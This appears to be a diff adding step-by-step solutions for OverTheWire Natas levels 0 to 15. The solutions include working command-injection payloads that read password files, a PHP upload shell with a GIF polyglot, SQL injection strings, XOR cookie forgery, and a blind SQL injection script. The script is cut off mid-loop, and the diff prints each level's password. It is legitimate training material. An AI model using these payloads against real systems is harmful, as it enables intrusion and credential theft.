@@ -17,6 +17,24 @@ Verification rule used throughout: a password is accepted only if a request to
   ```
   curl -s -u natas0:natas0 http://natas0.natas.labs.overthewire.org/ | grep "natas1 is"
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Start with the credential the game gives us.** The level page says the password for natas1 is on this page. Every natas level is behind HTTP Basic auth, so the first thing to establish is how to talk to it non-interactively: `curl -u natas0:natas0 URL` sends the `Authorization: Basic ...` header for us.
+2. **Fetch the page and look at the raw response, not the rendered text.** A browser hides comments; curl does not:
+   ```
+   curl -s -u natas0:natas0 http://natas0.natas.labs.overthewire.org/
+   ```
+   The `-s` flag matters: it silences curl's progress meter so the output is only the server's response, which is what makes it pipeable.
+3. **Search instead of eyeballing.** The page is small, but the habit generalises: pipe the response into `grep` for the thing the level asks for.
+   ```
+   curl -s -u natas0:natas0 http://natas0.natas.labs.overthewire.org/ | grep "natas1 is"
+   <!--The password for natas1 is scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7 -->
+   ```
+   The match is inside an HTML comment — still part of the response body, so it is served to anyone who asks.
+4. **Verify before recording the password.** Fetch the *next* level with the new credential and check it returns that level's page rather than a 401:
+   ```
+   curl -s -o /dev/null -w '%{http_code}\n' -u natas1:scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7 http://natas1.natas.labs.overthewire.org/
+   # 200
+   ```
 - **Password for natas1:** `scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7`
 - **Verification:** fetched `http://natas1.natas.labs.overthewire.org/` with `natas1:<password>` and got the level-1 page (HTTP 200 with natas1 content), which also displays the same password in its wechall info.
 - **Recording:** `recordings/natas/L0.cast`
@@ -29,6 +47,25 @@ Verification rule used throughout: a password is accepted only if a request to
   ```
   curl -s -u natas1:<pw> http://natas1.natas.labs.overthewire.org/ | grep "natas2 is"
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Log in with the password from level 0.** `curl -u natas1:<pw>` — the level's own page confirms the credential works.
+2. **Note what the page claims to block.** The `<body>` tag carries
+   ```
+   oncontextmenu="javascript:alert('right clicking has been blocked!');return false;"
+   ```
+   This is a client-side JavaScript handler. It runs only in a browser, and it only affects the context menu. It has no bearing on what the server sends.
+3. **Fetch the raw body anyway.** `curl` never executes JavaScript, so the handler is inert:
+   ```
+   curl -s -u natas1:scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7 http://natas1.natas.labs.overthewire.org/
+   ```
+   The response contains the level content plus the comment with the next password.
+4. **Extract the line.** The same grep pattern as level 0 works because the page format is identical:
+   ```
+   curl -s -u natas1:<pw> http://natas1.natas.labs.overthewire.org/ | grep "natas2 is"
+   <!--The password for natas2 is vsDOxoXyq3wckCP1ZmTZ71ngIA606odB -->
+   ```
+   The lesson: a client-side restriction is not a security control; the data is already in the response.
+5. **Verify.** `curl -u natas2:vsDOxoXyq3wckCP1ZmTZ71ngIA606odB http://natas2.natas.labs.overthewire.org/` → the level-2 page (HTTP 200).
 - **Password for natas2:** `vsDOxoXyq3wckCP1ZmTZ71ngIA606odB`
 - **Verification:** fetched `http://natas2.natas.labs.overthewire.org/` with `natas2:<password>` → HTTP 200 with the level-2 page.
 - **Recording:** `recordings/natas/L1.cast`
@@ -43,6 +80,29 @@ Verification rule used throughout: a password is accepted only if a request to
   curl -s -u natas2:<pw> http://natas2.natas.labs.overthewire.org/files/
   curl -s -u natas2:<pw> http://natas2.natas.labs.overthewire.org/files/users.txt
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the page.** The visible content is almost nothing: one image tag.
+   ```
+   curl -s -u natas2:<pw> http://natas2.natas.labs.overthewire.org/ | grep img
+   <img src="files/pixel.png">
+   ```
+   The `src` gives us a directory name (`files/`) that the page never links to.
+2. **Try the directory itself.** Servers with Apache's `Indexes` option render a listing for a directory request:
+   ```
+   curl -s -u natas2:<pw> http://natas2.natas.labs.overthewire.org/files/
+   ```
+   The HTML lists `pixel.png` and, next to it, **`users.txt`**. Piping the listing through `grep -o 'href="[^"]*"'` (as the recording does) shows the entries without the surrounding markup.
+3. **Fetch the interesting file.** It is a plain credentials list:
+   ```
+   curl -s -u natas2:<pw> http://natas2.natas.labs.overthewire.org/files/users.txt
+   # username:password
+   # alice:BYNdCesZqW
+   # bob:jw2ueICLvT
+   # ...
+   # natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI
+   ```
+   The target line is the `natas3:` entry.
+4. **Verify.** `curl -u natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI http://natas3.natas.labs.overthewire.org/` → HTTP 200.
 - **Password for natas3:** `K30JrSRHzjxq3paUQuwozY4MNvmNFyhI`
 - **Verification:** fetched `http://natas3.natas.labs.overthewire.org/` with `natas3:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L2.cast`
@@ -57,6 +117,26 @@ Verification rule used throughout: a password is accepted only if a request to
   curl -s -u natas3:<pw> http://natas3.natas.labs.overthewire.org/s3cr3t/
   curl -s -u natas3:<pw> http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the page and its comment.** The body says "There is nothing on this page"; the comment adds that not even Google will find it. That wording is a deliberate hint about crawler rules.
+2. **Go to `robots.txt`.** It is the file crawlers are told to read, and it is served publicly:
+   ```
+   curl -s -u natas3:<pw> http://natas3.natas.labs.overthewire.org/robots.txt
+   User-agent: *
+   Disallow: /s3cr3t/
+   ```
+   The `Disallow` line *names* the directory — it hides the path from crawlers by telling everyone where it is. This is the discovery step: robots.txt is a map, not a lock.
+3. **Request the disclosed directory.**
+   ```
+   curl -s -u natas3:<pw> http://natas3.natas.labs.overthewire.org/s3cr3t/
+   ```
+   Index listing enabled again → `users.txt`.
+4. **Fetch it.**
+   ```
+   curl -s -u natas3:<pw> http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
+   natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth
+   ```
+5. **Verify.** `curl -u natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth http://natas4.natas.labs.overthewire.org/` → HTTP 200.
 - **Password for natas4:** `JDrPnuZAKyl6MkiqQGFIddrqpvgOASth`
 - **Verification:** `http://natas4.natas.labs.overthewire.org/` with `natas4:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L3.cast`
@@ -69,6 +149,22 @@ Verification rule used throughout: a password is accepted only if a request to
   ```
   curl -s -u natas4:<pw> -H 'Referer: http://natas5.natas.labs.overthewire.org/' http://natas4.natas.labs.overthewire.org/
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **See the rejection message.** Fetching the page plainly gives:
+   ```
+   curl -s -u natas4:<pw> http://natas4.natas.labs.overthewire.org/
+   Access disallowed. You are visiting from "" while authorized users should come only from
+   "http://natas5.natas.labs.overthewire.org/"
+   ```
+   The empty quotes show the server saw **no** referrer at all — that is our first clue that it is reading the `Referer` header.
+2. **Understand what `Referer` is.** It is a header the *browser* sends to say which page linked to this one. The server only reads it; it cannot verify it. curl lets us set any header with `-H`.
+3. **Send the expected referrer.**
+   ```
+   curl -s -u natas4:<pw> -H 'Referer: http://natas5.natas.labs.overthewire.org/' http://natas4.natas.labs.overthewire.org/
+   Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
+   ```
+   The check is satisfied by a value we chose, so it is not an access control at all.
+4. **Verify.** `curl -u natas5:e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M http://natas5.natas.labs.overthewire.org/` → HTTP 200.
 - **Password for natas5:** `e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M`
 - **Verification:** `http://natas5.natas.labs.overthewire.org/` with `natas5:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L4.cast`
@@ -82,6 +178,21 @@ Verification rule used throughout: a password is accepted only if a request to
   curl -sI -u natas5:<pw> http://natas5.natas.labs.overthewire.org/ | grep -i set-cookie   # loggedin=0
   curl -s -u natas5:<pw> -b 'loggedin=1' http://natas5.natas.labs.overthewire.org/
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Fetch the page.** It says "You are not logged in." Nothing in the body says how login is represented.
+2. **Inspect the response headers.** `-I` asks curl for the headers only (`HEAD` request), and `-o /dev/null` discards any body:
+   ```
+   curl -sI -u natas5:<pw> http://natas5.natas.labs.overthewire.org/ | grep -i set-cookie
+   Set-Cookie: loggedin=0
+   ```
+   The server's idea of "logged in" is a single client-side cookie with a boolean value.
+3. **Forge it.** `-b 'loggedin=1'` sends a cookie with that exact name and value:
+   ```
+   curl -s -u natas5:<pw> -b 'loggedin=1' http://natas5.natas.labs.overthewire.org/
+   Access granted. The password for natas6 is 7mhjtShJAcld2NYbKHEadnhEwRn2P8VT
+   ```
+   Because the server stores no session state of its own, the value in our request *is* the truth as far as it is concerned.
+4. **Verify.** `curl -u natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT http://natas6.natas.labs.overthewire.org/` → HTTP 200.
 - **Password for natas6:** `7mhjtShJAcld2NYbKHEadnhEwRn2P8VT`
 - **Verification:** `http://natas6.natas.labs.overthewire.org/` with `natas6:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L5.cast`
@@ -96,6 +207,28 @@ Verification rule used throughout: a password is accepted only if a request to
   curl -s -u natas6:<pw> http://natas6.natas.labs.overthewire.org/includes/secret.inc
   curl -s -u natas6:<pw> -d 'secret=FOEIUWGHFEEUHOFUOIU&submit=1' http://natas6.natas.labs.overthewire.org/
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the page source.** The level links `index-source.html`, which is the PHP source with the HTML entities escaped. It shows the comparison and, crucially, where `$secret` comes from:
+   ```
+   curl -s -u natas6:<pw> http://natas6.natas.labs.overthewire.org/index-source.html
+   # include "includes/secret.inc";
+   # if(array_key_exists("secret", $_POST) and $_POST["secret"] == $secret) { ... }
+   ```
+   Grepping the source for `includes/secret.inc` gives us the path directly.
+2. **Fetch the include over HTTP.** An `include`d `.inc` file is not protected by the PHP engine — the web server serves it as a static file:
+   ```
+   curl -s -u natas6:<pw> http://natas6.natas.labs.overthewire.org/includes/secret.inc
+   <?
+   $secret = "FOEIUWGHFEEUHOFUOIU";
+   ?>
+   ```
+   Now we know the literal the form compares against.
+3. **Submit it.** The form is a POST; `-d` sends `application/x-www-form-urlencoded` data:
+   ```
+   curl -s -u natas6:<pw> -d 'secret=FOEIUWGHFEEUHOFUOIU&submit=1' http://natas6.natas.labs.overthewire.org/
+   Access granted. The password for natas7 is B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0
+   ```
+4. **Verify.** `curl -u natas7:B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0 http://natas7.natas.labs.overthewire.org/` → HTTP 200.
 - **Password for natas7:** `B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0`
 - **Verification:** `http://natas7.natas.labs.overthewire.org/` with `natas7:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L6.cast`
@@ -108,6 +241,20 @@ Verification rule used throughout: a password is accepted only if a request to
   ```
   curl -s -u natas7:<pw> 'http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8'
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the page and the comment.** The links are `index.php?page=home` and `index.php?page=about`, and the HTML comment states the goal explicitly:
+   ```
+   curl -s -u natas7:<pw> http://natas7.natas.labs.overthewire.org/ | grep -o 'hint:.*'
+   hint: password for webuser natas8 is in /etc/natas_webpass/natas8
+   ```
+2. **Infer the mechanism from the URL shape.** `?page=<name>` that selects content is almost always `include($_GET['page'])`. The value is used as a path, not validated against a list of allowed pages.
+3. **Substitute an absolute path.** No `../` is needed: the include accepts an absolute path directly, and PHP prints the file's contents into the page:
+   ```
+   curl -s -u natas7:<pw> 'http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8'
+   ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc
+   ```
+   The recording trims the surrounding `<br>`/comment markup with `sed` so the password stands alone.
+4. **Verify.** `curl -u natas8:ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc http://natas8.natas.labs.overthewire.org/` → HTTP 200.
 - **Password for natas8:** `ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc`
 - **Verification:** `http://natas8.natas.labs.overthewire.org/` with `natas8:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L7.cast`
@@ -122,6 +269,30 @@ Verification rule used throughout: a password is accepted only if a request to
   python3 -c "import base64; h='3d3d516343746d4d6d6c315669563362'; s=bytes.fromhex(h).decode()[::-1]; print(base64.b64decode(s).decode())"
   curl -s -u natas8:<pw> -d 'secret=oubWYf2kBq&submit=1' http://natas8.natas.labs.overthewire.org/
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the source.** `index-source.html` shows the comparison and the encoder:
+   ```
+   curl -s -u natas8:<pw> http://natas8.natas.labs.overthewire.org/index-source.html | grep -o 'encodedSecret&nbsp;=&nbsp;"[0-9a-f]*"'
+   encodedSecret&nbsp;=&nbsp;"3d3d516343746d4d6d6c315669563362"
+   ```
+   and
+   ```
+   function encodeSecret($secret) {
+       return bin2hex(strrev(base64_encode($secret)));
+   }
+   ```
+2. **Invert the pipeline, last operation first.** The encoder is base64 → reverse → hex. To undo it: hex-decode → reverse → base64-decode.
+   ```
+   python3 -c "import base64;h='3d3d516343746d4d6d6c315669563362';s=bytes.fromhex(h).decode()[::-1];print(base64.b64decode(s).decode())"
+   # oubWYf2kBq
+   ```
+   Each intermediate value can be checked by eye: `3d3d51...` hex-decodes to `==QcCtmMml1ViV3b`, reversing gives `b3ViV1lmMmtCcQ==` (a valid base64 string ending in `==`), and base64-decoding gives the secret.
+3. **Submit the recovered secret.**
+   ```
+   curl -s -u natas8:<pw> -d 'secret=oubWYf2kBq&submit=1' http://natas8.natas.labs.overthewire.org/
+   Access granted. The password for natas9 is UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9
+   ```
+4. **Verify.** `curl -u natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9 http://natas9.natas.labs.overthewire.org/` → HTTP 200.
 - **Password for natas9:** `UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9`
 - **Verification:** `http://natas9.natas.labs.overthewire.org/` with `natas9:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L8.cast`
@@ -134,6 +305,25 @@ Verification rule used throughout: a password is accepted only if a request to
   ```
   curl -s -u natas9:<pw> --data-urlencode 'needle=; cat /etc/natas_webpass/natas10 #' http://natas9.natas.labs.overthewire.org/
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the source.** The level exposes `index-source.html`; the relevant line is
+   ```
+   curl -s -u natas9:<pw> http://natas9.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g' | tr -d '\n' | grep -o 'passthru([^)]*)'
+   passthru("grep -i $key dictionary.txt");
+   ```
+   `$key` comes straight from the form and is interpolated into a shell command with no quoting and no escaping.
+2. **Recognise the sink.** `passthru` runs the string through `/bin/sh` and prints the raw output. Any shell metacharacter in `$key` is therefore executed by the shell — this is OS command injection, not a grep problem.
+3. **Craft the payload.** The command already has `dictionary.txt` after `$key`, so the injection must terminate the grep first and neutralise the trailing argument. `;` starts a new command; `#` comments out the rest:
+   ```
+   needle = ; cat /etc/natas_webpass/natas10 #
+   ```
+   The resulting shell line is `grep -i ; cat /etc/natas_webpass/natas10 # dictionary.txt` — grep runs (and errors, harmlessly), then cat prints the password file, and the trailing filename is commented out.
+4. **Send it with `--data-urlencode`.** The payload contains spaces, `;` and `#`, all of which must be URL-encoded; letting curl encode the field avoids hand-building `%20`/`%3B`/`%23`:
+   ```
+   curl -s -u natas9:<pw> --data-urlencode 'needle=; cat /etc/natas_webpass/natas10 #' http://natas9.natas.labs.overthewire.org/
+   ```
+   The `<pre>` block in the response contains the password (the recording strips the tags with `sed`).
+5. **Verify.** `curl -u natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv http://natas10.natas.labs.overthewire.org/` → HTTP 200.
 - **Password for natas10:** `EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv`
 - **Verification:** `http://natas10.natas.labs.overthewire.org/` with `natas10:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L9.cast`
@@ -146,6 +336,25 @@ Verification rule used throughout: a password is accepted only if a request to
   ```
   curl -s -u natas10:<pw> --data-urlencode 'needle=^ /etc/natas_webpass/natas11' http://natas10.natas.labs.overthewire.org/
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the source.** It is the same `passthru` construct plus a filter:
+   ```
+   curl -s -u natas10:<pw> http://natas10.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g' | tr -d '\n' | grep -o 'preg_match([^)]*)'
+   preg_match('/[;|&]/',$key)
+   ```
+   `;`, `|` and `&` are rejected, so the previous level's `; cat ...` payload is blocked.
+2. **Notice what is *not* filtered.** The string is still interpolated unquoted into `grep -i $key dictionary.txt`, so the shell still splits `$key` into **words**. Word splitting is not a metacharacter, so the filter does not see it.
+3. **Use grep's own argument handling.** `grep -i PATTERN FILE...` accepts multiple files. If we supply a pattern and then a path, the shell builds `grep -i <pattern> /etc/natas_webpass/natas11 dictionary.txt`: grep searches the password file *as well as* the dictionary. The pattern `^` matches every line, so the whole password file is printed.
+   ```
+   needle = ^ /etc/natas_webpass/natas11
+   ```
+   No shell metacharacter appears anywhere in the payload — it passes `preg_match` untouched.
+4. **Send it.** `--data-urlencode` encodes the space:
+   ```
+   curl -s -u natas10:<pw> --data-urlencode 'needle=^ /etc/natas_webpass/natas11' http://natas10.natas.labs.overthewire.org/
+   ```
+   The `<pre>` output has the password prefixed by the filename, because grep labels matches when given more than one file.
+5. **Verify.** `curl -u natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd http://natas11.natas.labs.overthewire.org/` → HTTP 200.
 - **Password for natas11:** `VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd`
 - **Verification:** `http://natas11.natas.labs.overthewire.org/` with `natas11:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L10.cast`
@@ -160,6 +369,50 @@ Verification rule used throughout: a password is accepted only if a request to
   # python: decode cookie, XOR with known plaintext -> key b'kBSw'; forge cookie for showpassword=yes
   curl -s -u natas11:<pw> -b 'data=EGAgHwQ1IxYYMSQYGSZxTUk7NgRJbnEVDCE8GwQwcU1JYTURDSQ1EUk%2F' http://natas11.natas.labs.overthewire.org/
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the source.** It shows the cookie format and the crypto:
+   ```
+   function xor_encrypt($in) {
+       $key = '<censored>'; $text = $in; $outText = '';
+       for($i=0;$i<strlen($text);$i++) $outText .= $text[$i] ^ $key[$i % strlen($key)];
+       return $outText;
+   }
+   function saveData($d) { setcookie("data", base64_encode(xor_encrypt(json_encode($d)))); }
+   ```
+   So the `data` cookie is `base64(JSON XOR repeating-key)`.
+2. **Get a sample cookie.** `-D-` prints response headers, `-o /dev/null` discards the body:
+   ```
+   curl -s -D- -o /dev/null -u natas11:<pw> http://natas11.natas.labs.overthewire.org/ | grep -i set-cookie
+   Set-Cookie: data=EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0%2FGBlgaVVIJDURDSQ1VRY%3D
+   ```
+3. **Recover the key from known plaintext.** The default object is `{"showpassword":"no","bgcolor":"#ffffff"}` — we know it exactly. XOR is its own inverse, so XORing the decoded cookie with that plaintext gives the keystream; because the key repeats, the first four bytes reveal it:
+   ```
+   python3 - <<'PY'
+   import base64, urllib.parse
+   ct = base64.b64decode(urllib.parse.unquote('EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0%2FGBlgaVVIJDURDSQ1VRY%3D'))
+   pt = b'{"showpassword":"no","bgcolor":"#ffffff"}'
+   print(bytes(a ^ b for a, b in zip(pt, ct))[:4])
+   PY
+   # b'kBSw'
+   ```
+   The recording prints `recovered key: b'kBSw'`. (The trailing bytes of the plaintext/ciphertext pair are shorter than the JSON; only the first key period is needed.)
+4. **Forge the new cookie.** Encrypt `{"showpassword":"yes","bgcolor":"#ffffff"}` with the recovered key, base64-encode, and URL-encode it for the header:
+   ```
+   python3 - <<'PY'
+   import base64, urllib.parse, json
+   key = b'kBSw'
+   want = json.dumps({"showpassword":"yes","bgcolor":"#ffffff"}, separators=(',',':')).encode()
+   enc = bytes(want[i] ^ key[i % len(key)] for i in range(len(want)))
+   print(urllib.parse.quote(base64.b64encode(enc).decode(), safe=''))
+   PY
+   ```
+   The printed value is the `data=` value the recording sends.
+5. **Send the forged cookie and read the flag.**
+   ```
+   curl -s -u natas11:<pw> -b 'data=EGAgHwQ1IxYYMSQYGSZxTUk7NgRJbnEVDCE8GwQwcU1JYTURDSQ1EUk%2F' http://natas11.natas.labs.overthewire.org/ | grep -i "password for natas12"
+   ```
+   The server decrypts, sees `showpassword=yes`, and prints the next password.
+6. **Verify.** `curl -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng http://natas12.natas.labs.overthewire.org/` → HTTP 200.
 - **Password for natas12:** `EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng`
 - **Verification:** `http://natas12.natas.labs.overthewire.org/` with `natas12:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L11.cast`
@@ -174,6 +427,28 @@ Verification rule used throughout: a password is accepted only if a request to
   curl -s -u natas12:<pw> -F 'filename=shell.php' -F 'uploadedfile=@/tmp/shell.php;type=image/jpeg' http://natas12.natas.labs.overthewire.org/index.php
   curl -s -u natas12:<pw> http://natas12.natas.labs.overthewire.org/upload/<random>.php
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the source.** The upload handler shows where the stored filename comes from:
+   ```
+   curl -s -u natas12:<pw> http://natas12.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g' | tr -d '\n' | grep -o 'makeRandomPathFromFilename[^)]*)'
+   makeRandomPathFromFilename("upload", $_POST["filename"])
+   ```
+   The random prefix is generated server-side, but the **extension is taken from the client-supplied `filename` POST field**.
+2. **Write a PHP payload.** The payload prints the next password file; `printf` (not `echo`) avoids shell interpretation of `$`:
+   ```
+   printf '<?php echo file_get_contents("/etc/natas_webpass/natas13"); ?>' > /tmp/shell.php
+   ls -l /tmp/shell.php
+   ```
+3. **Upload it with a `.php` name.** `-F` builds a multipart request: `filename=shell.php` sets the POST field the handler trusts for the extension, and `uploadedfile=@...` attaches the file. The `;type=image/jpeg` only sets the part's content type — the server does not check it at this level:
+   ```
+   curl -s -u natas12:<pw> -F 'filename=shell.php' -F 'uploadedfile=@/tmp/shell.php;type=image/jpeg' http://natas12.natas.labs.overthewire.org/index.php
+   ```
+   The response contains the stored path, e.g. `upload/t7fve9ekok.php`; the recording extracts it with `grep -o 'upload/[a-z0-9]*\.php'`.
+4. **Request the uploaded file.** The web server executes `.php` files, so the code runs with the web server's privileges and prints the password:
+   ```
+   curl -s -u natas12:<pw> http://natas12.natas.labs.overthewire.org/upload/t7fve9ekok.php
+   ```
+5. **Verify.** `curl -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k http://natas13.natas.labs.overthewire.org/` → HTTP 200.
 - **Password for natas13:** `g8ba0olAzaSJuyS4gnmbdVVigAICLG1k`
 - **Verification:** `http://natas13.natas.labs.overthewire.org/` with `natas13:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L12.cast`
@@ -189,6 +464,32 @@ Verification rule used throughout: a password is accepted only if a request to
   curl -s -u natas13:<pw> -F 'filename=shell.php' -F 'uploadedfile=@/tmp/shell13.php;type=image/gif' http://natas13.natas.labs.overthewire.org/index.php
   curl -s -u natas13:<pw> http://natas13.natas.labs.overthewire.org/upload/<random>.php
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the source.** The handler now adds one line before accepting the upload:
+   ```
+   curl -s -u natas13:<pw> http://natas13.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g' | tr -d '\n' | grep -o 'exif_imagetype[^)]*)'
+   exif_imagetype($_FILES['uploadedfile']['tmp_name'])
+   ```
+   `exif_imagetype` reads the first bytes of the file and returns an image type constant, or `false` if the magic bytes do not match a known format.
+2. **Understand exactly how weak that is.** It checks the **prefix only**, not the whole file, and it does not look at the extension. The six bytes `GIF89a` are the GIF signature, so a file that *starts* with them passes, whatever follows.
+3. **Build a polyglot: GIF header + PHP code.**
+   ```
+   printf 'GIF89a' > /tmp/shell13.php
+   printf '<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>' >> /tmp/shell13.php
+   file /tmp/shell13.php
+   # /tmp/shell13.php: GIF image data, version 89a, 0 x 0   (or similar)
+   ```
+   `file` agrees it looks like a GIF, which is exactly what `exif_imagetype` will decide.
+4. **Upload with the same `.php` trick as level 12.** The extension still comes from the POST `filename` field:
+   ```
+   curl -s -u natas13:<pw> -F 'filename=shell.php' -F 'uploadedfile=@/tmp/shell13.php;type=image/gif' http://natas13.natas.labs.overthewire.org/index.php
+   ```
+   The stored path this run is `upload/up58risls8.php`.
+5. **Request the stored file.** PHP ignores the leading GIF bytes (they are output, harmless) and executes the `<?php ... ?>` that follows:
+   ```
+   curl -s -u natas13:<pw> http://natas13.natas.labs.overthewire.org/upload/up58risls8.php
+   ```
+6. **Verify.** `curl -u natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8 http://natas14.natas.labs.overthewire.org/` → HTTP 200.
 - **Password for natas14:** `A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8`
 - **Verification:** `http://natas14.natas.labs.overthewire.org/` with `natas14:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L13.cast`
@@ -201,6 +502,25 @@ Verification rule used throughout: a password is accepted only if a request to
   ```
   curl -s -u natas14:<pw> --data-urlencode 'username=" OR 1=1 -- ' --data-urlencode 'password=x' http://natas14.natas.labs.overthewire.org/
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the source.** The login handler builds the query by concatenation:
+   ```
+   curl -s -u natas14:<pw> http://natas14.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g' | tr -d '\n' | grep -o 'SELECT[^;]*' | head -1
+   $query = "SELECT * from users where username=\"".$_POST["username"]."\" and password=\"".$_POST["password"]."\"";
+   ```
+   Both fields sit inside double quotes, so a `"` in either one closes the string literal.
+2. **Plan the injection.** We want a query that is true regardless of the credentials: close the username string, append `OR 1=1`, and comment out the password clause. MySQL's comment syntax is `-- ` (two dashes and a space) or `#`.
+   ```
+   username = " OR 1=1 -- 
+   password = x
+   ```
+   The resulting SQL is `SELECT * from users where username="" OR 1=1 -- " and password="x"`. Every row matches, so `mysqli_num_rows(...) > 0` is true.
+3. **Send it with `--data-urlencode`.** The username contains a quote and spaces, so let curl encode it rather than hand-writing `%22`/`%20`:
+   ```
+   curl -s -u natas14:<pw> --data-urlencode 'username=" OR 1=1 -- ' --data-urlencode 'password=x' http://natas14.natas.labs.overthewire.org/
+   ```
+   The response prints the "successful login" message and the natas15 password.
+4. **Verify.** `curl -u natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g http://natas15.natas.labs.overthewire.org/` → HTTP 200.
 - **Password for natas15:** `GB6USCJYJjwLyYhZUNkE1NwDueiTow6g`
 - **Verification:** `http://natas15.natas.labs.overthewire.org/` with `natas15:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L14.cast`
@@ -214,6 +534,52 @@ Verification rule used throughout: a password is accepted only if a request to
   curl -s -u natas15:<pw> --data-urlencode 'username=natas16" AND password LIKE "%' http://natas15.natas.labs.overthewire.org/
   # python: binary search on ORD(SUBSTR(password,pos,1)) over ASCII 32..126
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the source.** The query only takes a username, and the output is a fixed message either way:
+   ```
+   curl -s -u natas15:<pw> http://natas15.natas.labs.overthewire.org/index-source.html | sed 's/&nbsp;/ /g; s/<[^>]*>//g' | tr -d '\n' | grep -o 'SELECT [^;]*;' | head -1
+   $query = "SELECT * from users where username=\"".$_POST["username"]."\"";
+   # if(mysqli_num_rows($res) > 0) print "This user exists.<br>"; else print "This user doesn't exist.<br>";
+   ```
+   There is no password echo, so the response is a one-bit oracle: exists / doesn't exist.
+2. **Confirm we can test predicates on the password.** Append a condition after closing the username string:
+   ```
+   curl -s -u natas15:<pw> --data-urlencode 'username=natas16" AND password LIKE "%' http://natas15.natas.labs.overthewire.org/ | grep -i "exists"
+   # This user exists.
+   ```
+   This proves the row `natas16` exists and that our `AND` clause is being evaluated against its password.
+3. **Turn it into a character-by-character extraction.** `SUBSTR(password,pos,1)` isolates one character; `ORD()` turns it into a number; a comparison gives the oracle:
+   ```
+   natas16" AND ORD(SUBSTR(password,<pos>,1)) > <mid> -- 
+   ```
+   Binary search over ASCII 32..126 needs about 7 requests per character, instead of up to 95.
+4. **Drive it from Python.** The recording uses `urllib` with the Basic auth header built by hand, because the loop makes dozens of requests:
+   ```
+   python3 - <<'PY'
+   import urllib.request, urllib.parse, base64
+   url = 'http://natas15.natas.labs.overthewire.org/'
+   auth = 'Basic ' + base64.b64encode(b'natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g').decode()
+   def exists(p):
+       d = urllib.parse.urlencode({'username': p}).encode()
+       r = urllib.request.Request(url, data=d, headers={'Authorization': auth})
+       return b'This user exists' in urllib.request.urlopen(r, timeout=15).read()
+   out = ''
+   for pos in range(1, 33):
+       lo, hi = 32, 126
+       while lo < hi:
+           mid = (lo + hi) // 2
+           if exists(f'natas16" AND ORD(SUBSTR(password,{pos},1)) > {mid} -- '):
+               lo = mid + 1
+           else:
+               hi = mid
+       if lo == 32: break
